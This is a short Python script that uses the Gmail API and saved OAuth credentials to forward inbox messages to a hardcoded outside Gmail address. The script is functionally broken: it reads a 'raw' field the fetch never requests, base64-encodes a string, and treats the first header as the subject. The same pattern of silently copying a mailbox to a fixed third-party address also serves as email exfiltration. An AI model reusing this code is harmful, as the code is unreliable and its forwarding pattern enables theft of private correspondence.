import os
import base64
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google.oauth2.credentials import Credentials

def forward_emails():
    # Set up the Gmail API credentials
    creds = Credentials.from_authorized_user_file('credentials.json')
    service = build('gmail', 'v1', credentials=creds)

    # Get the user's email address
    user_info = service.users().getProfile(userId='me').execute()
    user_email = user_info['emailAddress']

    # Set the email to forward to
    forward_to = 'samsonpromise101@gmail.com'

    # Get the user's emails
    try:
        messages = service.users().messages().list(userId='me', labelIds=['INBOX']).execute()
        if 'messages' in messages:
            for message in messages['messages']:
                msg = service.users().messages().get(userId='me', id=message['id']).execute()
                headers = msg['payload']['headers']
                for header in headers:
                    if header['name'] == 'From' and user_email in header['value']:
                        # Forward the email
                        forward_message(service, 'me', msg['id'], forward_to)
    except HttpError as error:
        print(f'An error occurred: {error}')

def forward_message(service, user_id, msg_id, forward_to):
    message = service.users().messages().get(userId=user_id, id=msg_id).execute()
    new_message = create_forward_message(message, forward_to)
    send_message(service, user_id, new_message)

def create_forward_message(message, forward_to):
    new_message = {
        'raw': base64.urlsafe_b64encode(message['raw']).decode('utf-8'),
        'payload': {
            'headers': [
                {
                    'name': 'To',
                    'value': forward_to
                },
                {
                    'name': 'Subject',
                    'value': f'Fwd: {message["payload"]["headers"][0]["value"]}'
                },
                {
                    'name': 'References',
                    'value': message['payload']['headers'][0]['value']
                }
            ]
        }
    }
    return new_message

def send_message(service, user_id, message):
    try:
        service.users().messages().send(userId=user_id, body=message).execute()
    except HttpError as error:
        print(f'An error occurred while sending the message: {error}')

if __name__ == '__main__':
    forward_emails()

